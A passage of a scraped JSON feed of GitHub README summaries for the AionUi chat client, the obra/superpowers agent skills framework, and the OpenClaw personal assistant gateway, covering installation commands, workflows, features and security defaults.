Requirements</h3> \n<ul> \n <li><strong>macOS</strong>: 10.15 or higher</li> \n <li><strong>Windows</strong>: Windows 10 or higher</li> \n <li><strong>Linux</strong>: Ubuntu 18.04+ / Debian 10+ / Fedora 32+</li> \n <li><strong>Memory</strong>: Recommended 4GB or more</li> \n <li><strong>Storage</strong>: At least 500MB available space</li> \n</ul> \n<h3>📥 Download</h3> \n<p> <a href=\"https://github.com/iOfficeAI/AionUi/releases\"> <img alt=\"Download Latest Release\" height=\"50\" src=\"https://img.shields.io/badge/Download-Latest%20Release-32CD32?style=for-the-badge&amp;logo=github&amp;logoColor=white\" /> </a> </p> \n<h3>🍺 Install via Homebrew (macOS)</h3> \n<pre><code class=\"language-bash\">brew install aionui\n</code></pre> \n<h3>🔧 Simple Installation</h3> \n<ol> \n <li><strong>Download and install</strong> AionUi application</li> \n <li><strong>Configure AI service</strong> - Support Google account login or API Key authentication</li> \n <li><strong>Start using</strong> - Immediately experience modern AI chat interface</li> \n</ol> \n<blockquote> \n <p>💡 <strong>Need detailed configuration guide?</strong> Check out our <a href=\"https://github.com/iOfficeAI/AionUi/wiki/Getting-Started\">Complete Installation Tutorial</a></p> \n</blockquote> \n<hr /> \n<h2>🤝 Community &amp; Support</h2> \n<h3>💬 Community</h3> \n<p><strong>💡 Your ideas matter!</strong> We highly value every user's suggestions and feedback. Whether it's feature ideas, user experience, or issues you encounter, feel free to contact us anytime!</p> \n<p align=\"center\"> <a href=\"https://x.com/AionUi\" target=\"_blank\"> <img alt=\"Contact Us on X\" src=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/contactus-x.png\" width=\"600\" /> </a> </p> \n<ul> \n <li><a href=\"https://github.com/iOfficeAI/AionUi/discussions\">💬 GitHub Discussions</a> - <strong>Share ideas, make suggestions, exchange usage tips</strong></li> \n <li><a href=\"https://github.com/iOfficeAI/AionUi/issues\">🐛 Report Issues</a> - Report bugs or feature requests</li> \n <li><a href=\"https://github.com/iOfficeAI/AionUi/releases\">📦 Release Updates</a> - Get the latest version</li> \n <li><a href=\"https://discord.gg/2QAwJn7Egx\">💬 Discord Community</a> - <strong>Join our English Discord community</strong></li> \n <li><a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/wx.png\">💬 WeChat (Chinese Group)</a> - <strong>Click to view QR code</strong></li> \n <li><a href=\"https://discord.gg/2QAwJn7Egx\">💬 Discord Community</a> - <strong>Join our English Discord community</strong></li> \n <li><a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/resources/wx.png\">💬 WeChat (Chinese Group)</a> - <strong>Click to view QR code</strong></li> \n</ul> \n<h3>🤝 Contributing</h3> \n<p>Welcome to submit Issues and Pull Requests!</p> \n<ol> \n <li>Fork this project</li> \n <li>Create a feature branch (<code>git checkout -b feature/AmazingFeature</code>)</li> \n <li>Commit your changes (<code>git commit -m 'Add some AmazingFeature'</code>)</li> \n <li>Push to the branch (<code>git push origin feature/AmazingFeature</code>)</li> \n <li>Open a Pull Request</li> \n</ol> \n<hr /> \n<h2>📄 License</h2> \n<p>This project is licensed under <a href=\"https://raw.githubusercontent.com/iOfficeAI/AionUi/main/LICENSE\">Apache-2.0</a>.</p> \n<hr /> \n<h2>👥 Contributors</h2> \n<p>Thanks to all developers who have contributed to AionUi!</p> \n<p align=\"center\"> <a href=\"https://github.com/iOfficeAI/AionUi/graphs/contributors\"> <img alt=\"Contributors\" src=\"https://contrib.rocks/image?repo=iOfficeAI/AionUi&amp;max=50\" /> </a> </p> \n<h2>📊 Star History</h2> \n<p align=\"center\"> <a href=\"https://www.star-history.com/#iOfficeAI/aionui&amp;Date\" target=\"_blank\"> <img alt=\"GitHub Star Trends\" src=\"https://api.star-history.com/svg?repos=iOfficeAI/aionui&amp;type=Date\" width=\"600\" /> </a> </p> \n<div align=\"center\"> \n <p><strong>⭐ If you like it, give us a star</strong></p> \n <p><a href=\"https://github.com/iOfficeAI/AionUi/issues\">Report Bug</a> · <a href=\"https://github.com/iOfficeAI/AionUi/issues\">Request Feature</a></p> \n</div>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:02.259065Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 13,
        "timeliness_score": 1,
        "final_score": 4.6,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/obra/superpowers",
        "title": "obra/superpowers",
        "summary": "<p>An agentic skills framework & software development methodology that works.</p><hr /><h1>Superpowers</h1> \n<p>Superpowers is a complete software development workflow for your coding agents, built on top of a set of composable \"skills\" and some initial instructions that make sure your agent uses them.</p> \n<h2>How it works</h2> \n<p>It starts from the moment you fire up your coding agent. As soon as it sees that you're building something, it <em>doesn't</em> just jump into trying to write code. Instead, it steps back and asks you what you're really trying to do.</p> \n<p>Once it's teased a spec out of the conversation, it shows it to you in chunks short enough to actually read and digest.</p> \n<p>After you've signed off on the design, your agent puts together an implementation plan that's clear enough for an enthusiastic junior engineer with poor taste, no judgement, no project context, and an aversion to testing to follow. It emphasizes true red/green TDD, YAGNI (You Aren't Gonna Need It), and DRY.</p> \n<p>Next up, once you say \"go\", it launches a <em>subagent-driven-development</em> process, having agents work through each engineering task, inspecting and reviewing their work, and continuing forward. It's not uncommon for Claude to be able to work autonomously for a couple hours at a time without deviating from the plan you put together.</p> \n<p>There's a bunch more to it, but that's the core of the system. And because the skills trigger automatically, you don't need to do anything special. Your coding agent just has Superpowers.</p> \n<h2>Sponsorship</h2> \n<p>If Superpowers has helped you do stuff that makes money and you are so inclined, I'd greatly appreciate it if you'd consider <a href=\"https://github.com/sponsors/obra\">sponsoring my opensource work</a>.</p> \n<p>Thanks!</p> \n<ul> \n <li>Jesse</li> \n</ul> \n<h2>Installation</h2> \n<p><strong>Note:</strong> Installation differs by platform. Claude Code has a built-in plugin system. Codex and OpenCode require manual setup.</p> \n<h3>Claude Code (via Plugin Marketplace)</h3> \n<p>In Claude Code, register the marketplace first:</p> \n<pre><code class=\"language-bash\">/plugin marketplace add obra/superpowers-marketplace\n</code></pre> \n<p>Then install the plugin from this marketplace:</p> \n<pre><code class=\"language-bash\">/plugin install superpowers@superpowers-marketplace\n</code></pre> \n<h3>Verify Installation</h3> \n<p>Start a new session and ask Claude to help with something that would trigger a skill (e.g., \"help me plan this feature\" or \"let's debug this issue\"). Claude should automatically invoke the relevant superpowers skill.</p> \n<h3>Codex</h3> \n<p>Tell Codex:</p> \n<pre><code>Fetch and follow instructions from https://raw.githubusercontent.com/obra/superpowers/refs/heads/main/.codex/INSTALL.md\n</code></pre> \n<p><strong>Detailed docs:</strong> <a href=\"https://raw.githubusercontent.com/obra/superpowers/main/docs/README.codex.md\">docs/README.codex.md</a></p> \n<h3>OpenCode</h3> \n<p>Tell OpenCode:</p> \n<pre><code>Fetch and follow instructions from https://raw.githubusercontent.com/obra/superpowers/refs/heads/main/.opencode/INSTALL.md\n</code></pre> \n<p><strong>Detailed docs:</strong> <a href=\"https://raw.githubusercontent.com/obra/superpowers/main/docs/README.opencode.md\">docs/README.opencode.md</a></p> \n<h2>The Basic Workflow</h2> \n<ol> \n <li> <p><strong>brainstorming</strong> - Activates before writing code. Refines rough ideas through questions, explores alternatives, presents design in sections for validation. Saves design document.</p> </li> \n <li> <p><strong>using-git-worktrees</strong> - Activates after design approval. Creates isolated workspace on new branch, runs project setup, verifies clean test baseline.</p> </li> \n <li> <p><strong>writing-plans</strong> - Activates with approved design. Breaks work into bite-sized tasks (2-5 minutes each). Every task has exact file paths, complete code, verification steps.</p> </li> \n <li> <p><strong>subagent-driven-development</strong> or <strong>executing-plans</strong> - Activates with plan. Dispatches fresh subagent per task with two-stage review (spec compliance, then code quality), or executes in batches with human checkpoints.</p> </li> \n <li> <p><strong>test-driven-development</strong> - Activates during implementation. Enforces RED-GREEN-REFACTOR: write failing test, watch it fail, write minimal code, watch it pass, commit. Deletes code written before tests.</p> </li> \n <li> <p><strong>requesting-code-review</strong> - Activates between tasks. Reviews against plan, reports issues by severity. Critical issues block progress.</p> </li> \n <li> <p><strong>finishing-a-development-branch</strong> - Activates when tasks complete. Verifies tests, presents options (merge/PR/keep/discard), cleans up worktree.</p> </li> \n</ol> \n<p><strong>The agent checks for relevant skills before any task.</strong> Mandatory workflows, not suggestions.</p> \n<h2>What's Inside</h2> \n<h3>Skills Library</h3> \n<p><strong>Testing</strong></p> \n<ul> \n <li><strong>test-driven-development</strong> - RED-GREEN-REFACTOR cycle (includes testing anti-patterns reference)</li> \n</ul> \n<p><strong>Debugging</strong></p> \n<ul> \n <li><strong>systematic-debugging</strong> - 4-phase root cause process (includes root-cause-tracing, defense-in-depth, condition-based-waiting techniques)</li> \n <li><strong>verification-before-completion</strong> - Ensure it's actually fixed</li> \n</ul> \n<p><strong>Collaboration</strong></p> \n<ul> \n <li><strong>brainstorming</strong> - Socratic design refinement</li> \n <li><strong>writing-plans</strong> - Detailed implementation plans</li> \n <li><strong>executing-plans</strong> - Batch execution with checkpoints</li> \n <li><strong>dispatching-parallel-agents</strong> - Concurrent subagent workflows</li> \n <li><strong>requesting-code-review</strong> - Pre-review checklist</li> \n <li><strong>receiving-code-review</strong> - Responding to feedback</li> \n <li><strong>using-git-worktrees</strong> - Parallel development branches</li> \n <li><strong>finishing-a-development-branch</strong> - Merge/PR decision workflow</li> \n <li><strong>subagent-driven-development</strong> - Fast iteration with two-stage review (spec compliance, then code quality)</li> \n</ul> \n<p><strong>Meta</strong></p> \n<ul> \n <li><strong>writing-skills</strong> - Create new skills following best practices (includes testing methodology)</li> \n <li><strong>using-superpowers</strong> - Introduction to the skills system</li> \n</ul> \n<h2>Philosophy</h2> \n<ul> \n <li><strong>Test-Driven Development</strong> - Write tests first, always</li> \n <li><strong>Systematic over ad-hoc</strong> - Process over guessing</li> \n <li><strong>Complexity reduction</strong> - Simplicity as primary goal</li> \n <li><strong>Evidence over claims</strong> - Verify before declaring success</li> \n</ul> \n<p>Read more: <a href=\"https://blog.fsck.com/2025/10/09/superpowers/\">Superpowers for Claude Code</a></p> \n<h2>Contributing</h2> \n<p>Skills live directly in this repository. To contribute:</p> \n<ol> \n <li>Fork the repository</li> \n <li>Create a branch for your skill</li> \n <li>Follow the <code>writing-skills</code> skill for creating and testing new skills</li> \n <li>Submit a PR</li> \n</ol> \n<p>See <code>skills/writing-skills/SKILL.md</code> for the complete guide.</p> \n<h2>Updating</h2> \n<p>Skills update automatically when you update the plugin:</p> \n<pre><code class=\"language-bash\">/plugin update superpowers\n</code></pre> \n<h2>License</h2> \n<p>MIT License - see LICENSE file for details</p> \n<h2>Support</h2> \n<ul> \n <li><strong>Issues</strong>: <a href=\"https://github.com/obra/superpowers/issues\">https://github.com/obra/superpowers/issues</a></li> \n <li><strong>Marketplace</strong>: <a href=\"https://github.com/obra/superpowers-marketplace\">https://github.com/obra/superpowers-marketplace</a></li> \n</ul>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:02.259082Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 13,
        "timeliness_score": 1,
        "final_score": 4.6,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/openclaw/openclaw",
        "title": "openclaw/openclaw",
        "summary": "<p>Your own personal AI assistant. Any OS. Any Platform. The lobster way. 🦞</p><hr /><h1>🦞 OpenClaw — Personal AI Assistant</h1> \n<p align=\"center\"> \n  \n  <source media=\"(prefers-color-scheme: light)\" /> \n  <img alt=\"OpenClaw\" src=\"https://raw.githubusercontent.com/openclaw/openclaw/main/docs/assets/openclaw-logo-text.png\" width=\"500\" /> \n  </p> \n<p align=\"center\"> <strong>EXFOLIATE! EXFOLIATE!</strong> </p> \n<p align=\"center\"> <a href=\"https://github.com/openclaw/openclaw/actions/workflows/ci.yml?branch=main\"><img alt=\"CI status\" src=\"https://img.shields.io/github/actions/workflow/status/openclaw/openclaw/ci.yml?branch=main&amp;style=for-the-badge\" /></a> <a href=\"https://github.com/openclaw/openclaw/releases\"><img alt=\"GitHub release\" src=\"https://img.shields.io/github/v/release/openclaw/openclaw?include_prereleases&amp;style=for-the-badge\" /></a> <a href=\"https://discord.gg/clawd\"><img alt=\"Discord\" src=\"https://img.shields.io/discord/1456350064065904867?label=Discord&amp;logo=discord&amp;logoColor=white&amp;color=5865F2&amp;style=for-the-badge\" /></a> <a href=\"https://raw.githubusercontent.com/openclaw/openclaw/main/LICENSE\"><img alt=\"MIT License\" src=\"https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge\" /></a> </p> \n<p><strong>OpenClaw</strong> is a <em>personal AI assistant</em> you run on your own devices. It answers you on the channels you already use (WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, iMessage, Microsoft Teams, WebChat), plus extension channels like BlueBubbles, Matrix, Zalo, and Zalo Personal. It can speak and listen on macOS/iOS/Android, and can render a live Canvas you control. The Gateway is just the control plane — the product is the assistant.</p> \n<p>If you want a personal, single-user assistant that feels local, fast, and always-on, this is it.</p> \n<p><a href=\"https://openclaw.ai\">Website</a> · <a href=\"https://docs.openclaw.ai\">Docs</a> · <a href=\"https://deepwiki.com/openclaw/openclaw\">DeepWiki</a> · <a href=\"https://docs.openclaw.ai/start/getting-started\">Getting Started</a> · <a href=\"https://docs.openclaw.ai/install/updating\">Updating</a> · <a href=\"https://docs.openclaw.ai/start/showcase\">Showcase</a> · <a href=\"https://docs.openclaw.ai/start/faq\">FAQ</a> · <a href=\"https://docs.openclaw.ai/start/wizard\">Wizard</a> · <a href=\"https://github.com/openclaw/nix-openclaw\">Nix</a> · <a href=\"https://docs.openclaw.ai/install/docker\">Docker</a> · <a href=\"https://discord.gg/clawd\">Discord</a></p> \n<p>Preferred setup: run the onboarding wizard (<code>openclaw onboard</code>) in your terminal. The wizard guides you step by step through setting up the gateway, workspace, channels, and skills. The CLI wizard is the recommended path and works on <strong>macOS, Linux, and Windows (via WSL2; strongly recommended)</strong>. Works with npm, pnpm, or bun. New install? Start here: <a href=\"https://docs.openclaw.ai/start/getting-started\">Getting started</a></p> \n<p><strong>Subscriptions (OAuth):</strong></p> \n<ul> \n <li><strong><a href=\"https://www.anthropic.com/\">Anthropic</a></strong> (Claude Pro/Max)</li> \n <li><strong><a href=\"https://openai.com/\">OpenAI</a></strong> (ChatGPT/Codex)</li> \n</ul> \n<p>Model note: while any model is supported, I strongly recommend <strong>Anthropic Pro/Max (100/200) + Opus 4.6</strong> for long‑context strength and better prompt‑injection resistance. See <a href=\"https://docs.openclaw.ai/start/onboarding\">Onboarding</a>.</p> \n<h2>Models (selection + auth)</h2> \n<ul> \n <li>Models config + CLI: <a href=\"https://docs.openclaw.ai/concepts/models\">Models</a></li> \n <li>Auth profile rotation (OAuth vs API keys) + fallbacks: <a href=\"https://docs.openclaw.ai/concepts/model-failover\">Model failover</a></li> \n</ul> \n<h2>Install (recommended)</h2> \n<p>Runtime: <strong>Node ≥22</strong>.</p> \n<pre><code class=\"language-bash\">npm install -g openclaw@latest\n# or: pnpm add -g openclaw@latest\n\nopenclaw onboard --install-daemon\n</code></pre> \n<p>The wizard installs the Gateway daemon (launchd/systemd user service) so it stays running.</p> \n<h2>Quick start (TL;DR)</h2> \n<p>Runtime: <strong>Node ≥22</strong>.</p> \n<p>Full beginner guide (auth, pairing, channels): <a href=\"https://docs.openclaw.ai/start/getting-started\">Getting started</a></p> \n<pre><code class=\"language-bash\">openclaw onboard --install-daemon\n\nopenclaw gateway --port 18789 --verbose\n\n# Send a message\nopenclaw message send --to +1234567890 --message \"Hello from OpenClaw\"\n\n# Talk to the assistant (optionally deliver back to any connected channel: WhatsApp/Telegram/Slack/Discord/Google Chat/Signal/iMessage/BlueBubbles/Microsoft Teams/Matrix/Zalo/Zalo Personal/WebChat)\nopenclaw agent --message \"Ship checklist\" --thinking high\n</code></pre> \n<p>Upgrading? <a href=\"https://docs.openclaw.ai/install/updating\">Updating guide</a> (and run <code>openclaw doctor</code>).</p> \n<h2>Development channels</h2> \n<ul> \n <li><strong>stable</strong>: tagged releases (<code>vYYYY.M.D</code> or <code>vYYYY.M.D-&lt;patch&gt;</code>), npm dist-tag <code>latest</code>.</li> \n <li><strong>beta</strong>: prerelease tags (<code>vYYYY.M.D-beta.N</code>), npm dist-tag <code>beta</code> (macOS app may be missing).</li> \n <li><strong>dev</strong>: moving head of <code>main</code>, npm dist-tag <code>dev</code> (when published).</li> \n</ul> \n<p>Switch channels (git + npm): <code>openclaw update --channel stable|beta|dev</code>. Details: <a href=\"https://docs.openclaw.ai/install/development-channels\">Development channels</a>.</p> \n<h2>From source (development)</h2> \n<p>Prefer <code>pnpm</code> for builds from source. Bun is optional for running TypeScript directly.</p> \n<pre><code class=\"language-bash\">git clone https://github.com/openclaw/openclaw.git\ncd openclaw\n\npnpm install\npnpm ui:build # auto-installs UI deps on first run\npnpm build\n\npnpm openclaw onboard --install-daemon\n\n# Dev loop (auto-reload on TS changes)\npnpm gateway:watch\n</code></pre> \n<p>Note: <code>pnpm openclaw ...</code> runs TypeScript directly (via <code>tsx</code>). <code>pnpm build</code> produces <code>dist/</code> for running via Node / the packaged <code>openclaw</code> binary.</p> \n<h2>Security defaults (DM access)</h2> \n<p>OpenClaw connects to real messaging surfaces. Treat inbound DMs as <strong>untrusted input</strong>.</p> \n<p>Full security guide: <a href=\"https://docs.openclaw.ai/gateway/security\">Security</a></p> \n<p>Default behavior on Telegram/WhatsApp/Signal/iMessage/Microsoft Teams/Discord/Google Chat/Slack:</p> \n<ul> \n <li><strong>DM pairing</strong> (<code>dmPolicy=\"pairing\"</code> / <code>channels.discord.dm.policy=\"pairing\"</code> / <code>channels.slack.dm.policy=\"pairing\"</code>): unknown senders receive a short pairing code and the bot does not process their message.</li> \n <li>Approve with: <code>openclaw pairing approve &lt;channel&gt; &lt;code&gt;</code> (then the sender is added to a local allowlist store).</li> \n <li>Public inbound DMs require an explicit opt-in: set <code>dmPolicy=\"open\"</code> and include <code>\"*\"</code> in the channel allowlist (<code>allowFrom</code> / <code>channels.discord.dm.allowFrom</code> / <code>channels.slack.dm.allowFrom</code>).</li> \n</ul> \n<p>Run <code>openclaw doctor</code> to surface risky/misconfigured DM policies.</p> \n<h2>Highlights</h2> \n<ul> \n <li><strong><a href=\"https://docs.openclaw.ai/gateway\">Local-first Gateway</a></strong> — single control plane for sessions, channels, tools, and events.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/channels\">Multi-channel inbox</a></strong> — WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, BlueBubbles (iMessage), iMessage (legacy), Microsoft Teams, Matrix, Zalo, Zalo Personal, WebChat, macOS, iOS/Android.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/gateway/configuration\">Multi-agent routing</a></strong> — route inbound channels/accounts/peers to isolated agents (workspaces + per-agent sessions).</li> \n <li><strong><a href=\"https://docs.openclaw.ai/nodes/voicewake\">Voice Wake</a> + <a href=\"https://docs.openclaw.ai/nodes/talk\">Talk Mode</a></strong> — always-on speech for macOS/iOS/Android with ElevenLabs.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/platforms/mac/canvas\">Live Canvas</a></strong> — agent-driven visual workspace with <a href=\"https://docs.openclaw.ai/platforms/mac/canvas#canvas-a2ui\">A2UI</a>.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/tools\">First-class tools</a></strong> — browser, canvas, nodes, cron, sessions, and Discord/Slack actions.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/platforms/macos\">Companion apps</a></strong> — macOS menu bar app + iOS/Android <a href=\"https://docs.openclaw.ai/nodes\">nodes</a>.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/start/wizard\">Onboarding</a> + <a href=\"https://docs.openclaw.ai/tools/skills\">skills</a></strong> — wizard-driven setup with bundled/managed/workspace skills.</li> \n</ul> \n<h2>Star History</h2> \n<p><a href=\"https://www.star-history.com/#openclaw/openclaw&amp;type=date&amp;legend=top-left\"><img alt=\"Star History Chart\" src=\"https://api.star-history.com/svg?repos=openclaw/openclaw&amp;type=date&amp;legend=top-left\" /></a></p> \n<h2>Everything we built so far</h2> \n<h3>Core platform</h3> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/gateway\">Gateway WS control plane</a> with sessions, presence, config, cron, webhooks, <a href=\"https://docs.openclaw.ai/web\">Control UI</a>, and <a href=\"https://docs.openclaw.ai/platforms/mac/canvas#canvas-a2ui\">Canvas host</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/tools/agent-send\">CLI surface</a>: gateway, agent, send, <a href=\"https://docs.openclaw.ai/start/wizard\">wizard</a>, and <a href=\"https://docs.openclaw.ai/gateway/doctor\">doctor</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/concepts/agent\">Pi agent runtime</a> in RPC mode with tool streaming and block streaming.</li> \n <li><a href=\"https://docs.openclaw.ai/concepts/session\">Session model</a>: <code>main</code> for direct chats, group isolation, activation modes, queue modes, reply-back. Group rules: <a href=\"https://docs.openclaw.ai/concepts/groups\">Groups</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/nodes/images\">Media pipeline</a>: images/audio/video, transcription hooks, size caps, temp file lifecycle. Audio details: <a href=\"https://docs.openclaw.ai/nodes/audio\">Audio</a>.</li> \n</ul> \n<h3>Channels</h3> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/channels\">Channels</a>: <a href=\"https://docs.openclaw.ai/channels/whatsapp\">WhatsApp</a> (Baileys), <a href=\"https://docs.openclaw.ai/channels/telegram\">Telegram</a> (grammY), <a href=\"https://docs.openclaw.ai/channels/slack\">Slack</a> (Bolt), <a href=\"https://docs.openclaw.ai/channels/discord\">Discord</a> (discord.js), <a href=\"https://docs.openclaw.ai/channels/googlechat\">Google Chat</a> (Chat API), <a href=\"https://docs.openclaw.ai/channels/signal\">Signal</a> (signal-cli), <a href=\"https://docs.openclaw.ai/channels/bluebubbles\">BlueBubbles</a> (iMessage, recommended), <a href=\"https://docs.openclaw.ai/channels/imessage\">iMessage</a> (legacy imsg), <a href=\"https://docs.openclaw.ai/channels/msteams\">Microsoft Teams</a> (extension), <a href=\"https://docs.openclaw.ai/channels/matrix\">Matrix</a> (extension), <a href=\"https://docs.openclaw.ai/channels/zalo\">Zalo</a> (extension), <a href=\"https://docs.openclaw.ai/channels/zalouser\">Zalo Personal</a> (extension), <a href=\"https://docs.openclaw.ai/web/webchat\">WebChat</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/concepts/group-messages\">Group routing</a>: mention gating, reply tags, per-channel chunking and routing. Channel rules: <a href=\"https://docs.openclaw.ai/channels\">Channels</a>.</li> \n</ul> \n<h3>Apps + nodes</h3> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/platforms/macos\">macOS app</a>: menu bar control plane, <a href=\"https://docs.openclaw.ai/nodes/voicewake\">Voice Wake</a>/PTT, <a href=\"https://docs.openclaw.ai/nodes/talk\">Talk Mode</a> overlay, <a href=\"https://docs.openclaw.ai/web/webchat\">WebChat</a>, debug tools, <a href=\"https://docs.openclaw.ai/gateway/remote\">remote gateway</a> control.</li> \n <li><a href=\"https://docs.openclaw.ai/platforms/ios\">iOS node</a>: <a href=\"https://docs.openclaw.ai/platforms/mac/canvas\">Canvas</a>, <a href=\"https://docs.openclaw.ai/nodes/voicewake\">Voice Wake</a>, <a href=\"https://docs.openclaw.ai/nodes/talk\">Talk Mode</a>, camera, screen recording, Bonjour pairing.</li> \n <li><a href=\"https://docs.openclaw.ai/platforms/android\">Android node</a>: <a href=\"https://docs.openclaw.ai/platforms/mac/canvas\">Canvas</a>, <a href=\"https://docs.openclaw.ai/nodes/talk\">Talk Mode</a>, camera, screen recording, optional SMS.</li> \n <li><a href=\"https://docs.openclaw.ai/nodes\">macOS node mode</a>: system.run/notify + canvas/camera exposure.</li> \n</ul> \n<h3>Tools + automation</h3> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/tools/browser\">Browser control</a>: dedicated openclaw Chrome/Chromium, snapshots, actions, uploads, profiles.</li> \n <li><a href=\"https://docs.openclaw.ai/platforms/mac/canvas\">Canvas</a>: <a href=\"https://docs.openclaw.ai/platforms/mac/canvas#canvas-a2ui\">A2UI</a> push/reset, eval, snapshot.</li> \n <li><a href=\"https://docs.openclaw.ai/nodes\">Nodes</a>: camera snap/clip, screen record, <a href=\"https://docs.openclaw.ai/nodes/location-command\">location.get</a>, notifications.</li> \n <li><a href=\"https://docs.openclaw.ai/automation/cron-jobs\">Cron + wakeups</a>; <a href=\"https://docs.openclaw.ai/automation/webhook\">webhooks</a>; <a href=\"https://docs.openclaw.ai/automation/gmail-pubsub\">Gmail Pub/Sub</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/tools/skills\">Skills platform</a>: bundled, managed, and workspace skills with install gating + UI.</li> \n</ul> \n<h3>Runtime + safety</h3> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/concepts/channel-routing\">Channel routing</a>, <a href=\"https://docs.openclaw.ai/concepts/retry\">retry policy</a>, and <a href=\"https://docs.openclaw.ai/concepts/streaming\">streaming/chunking</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/concepts/presence\">Presence</a>, <a href=\"https://docs.openclaw.ai/concepts/typing-indicators\">typing indicators</a>, and <a href=\"https://docs.openclaw.ai/concepts/usage-tracking\">usage tracking</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/concepts/models\">Models</a>, <a href=\"https://docs.openclaw.ai/concepts/model-failover\">model failover</a>, and <a href=\"https://docs.openclaw.ai/concepts/session-pruning\">session pruning</a>.</li> \n <li><a href=\"https://docs.openclaw.ai/gateway/security\">Security</a> and <a href=\"https://docs.openclaw.ai/channels/troubleshooting\">troubleshooting</a>.</li> \n</ul> \n<h3>Ops + packaging</h3> \n<ul> \n <li><a href=\"https://docs.openclaw.ai/web\">Control UI</a> + <a href=\"https://docs.openclaw.ai/web/webchat\">WebChat</a> served directly from the Gateway.</li> \n <li><a href=\"https://docs.openclaw.ai/gateway/tailscale\">Tailscale Serve/Funnel</a> or <a href=\"https://docs.openclaw.ai/gateway/remote\">SSH tunnels</a> with token/password auth.</li> \n <li><a href=\"https://docs.openclaw.ai/install/nix\">Nix mode</a> for declarative config; <a href=\"https://docs.openclaw.ai/install/docker\">Docker</a>-based installs.</li> \n <li><a href=\"https://docs.openclaw.ai/gateway/doctor\">Doctor</a> migrations, <a href=\"https://docs.openclaw.ai/logging\">logging</a>.</li> \n</ul> \n<h2>How it works (short)</h2> \n<pre><code>WhatsApp / Telegram / Slack / Discord / Google Chat / Signal / iMessage / BlueBubbles / Microsoft Teams / Matrix / Zalo / Zalo Personal / WebChat\n               │\n               ▼\n┌───────────────────────────────┐\n│            Gateway            │\n│       (control plane)         │\n│     ws://127.0.0.1:18789      │\n└──────────────┬────────────────┘\n               │\n               ├─ Pi agent (RPC)\n               ├─ CLI (openclaw …)\n               ├─ WebChat UI\n               ├─ macOS app\n               └─ iOS / Android nodes\n</code></pre> \n<h2>Key subsystems</h2> \n<ul> \n <li><strong><a href=\"https://docs.openclaw.ai/concepts/architecture\">Gateway WebSocket network</a></strong> — single WS control plane for clients, tools, and events (plus ops: <a href=\"https://docs.openclaw.ai/gateway\">Gateway runbook</a>).</li> \n <li><strong><a href=\"https://docs.openclaw.ai/gateway/tailscale\">Tailscale exposure</a></strong> — Serve/Funnel for the Gateway dashboard + WS (remote access: <a href=\"https://docs.openclaw.ai/gateway/remote\">Remote</a>).</li> \n <li><strong><a href=\"https://docs.openclaw.ai/tools/browser\">Browser control</a></strong> — openclaw‑managed Chrome/Chromium with CDP control.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/platforms/mac/canvas\">Canvas + A2UI</a></strong> — agent‑driven visual workspace (A2UI host: <a href=\"https://docs.openclaw.ai/platforms/mac/canvas#canvas-a2ui\">Canvas/A2UI</a>).</li> \n <li><strong><a href=\"https://docs.openclaw.ai/nodes/voicewake\">Voice Wake</a> + <a href=\"https://docs.openclaw.ai/nodes/talk\">Talk Mode</a></strong> — always‑on speech and continuous conversation.</li> \n <li><strong><a href=\"https://docs.openclaw.ai/nodes\">Nodes</a></strong> — Canvas, camera snap/clip, screen record, <code>location.get</code>, notifications, plus macOS‑only <code>system.run</code>/<code>system.notify</code>.</li> \n</ul> \n<h2>Tailscale access (Gateway dashboard)</h2> \n<p>OpenClaw can auto-configure Tailscale <strong>Serve</strong> (tailnet-only) or <strong>Funnel</strong> (public) while the Gateway stays bound to loopback. Configure <code>gateway.tailscale.mode</code>:</p> \n<ul> \n <li><code>off</code>: no Tailscale automation (default).</li> \n <li><code>serve</code>: tailnet-only HTTPS via <code>tailscale serve</code> (uses Tailscale identity headers by default).</li> \n <li><code>funnel</code>: public HTTPS via <code>tailscale funnel</code> (requires shared password auth).</li> \n</ul> \n<p>Notes:</p> \n<ul> \n <li><code>gateway.bind</code> must stay <code>loopback</code> when Serve/Funnel is enabled (OpenClaw enforces this).</li> \n <li>Serve can be forced to require a password by setting <code>gateway.auth.mode: \"password\"</code> or <code>gateway.auth.allowTailscale: false</code>.</li> \n <li>Funnel refuses to start unless <code>gateway.auth.mode: \"password\"</code> is set.</li> \n <li>Optional: <code>gateway.tailscale.resetOnExit</code> to undo Serve/Funnel on shutdown.</li> \n</ul> \n<p>Details: <a href=\"https://docs.openclaw.ai/gateway/tailscale\">Tailscale guide</a> · <a href=\"https://docs.openclaw.ai/web\">Web surfaces</a></p> \n<h2>Remote Gateway (Linux is great)</h2> \n<p>It’s perfectly fine to run the Gateway on a small Linux instance. Clients (macOS app, CLI, WebChat) can connect over <strong>Tailscale 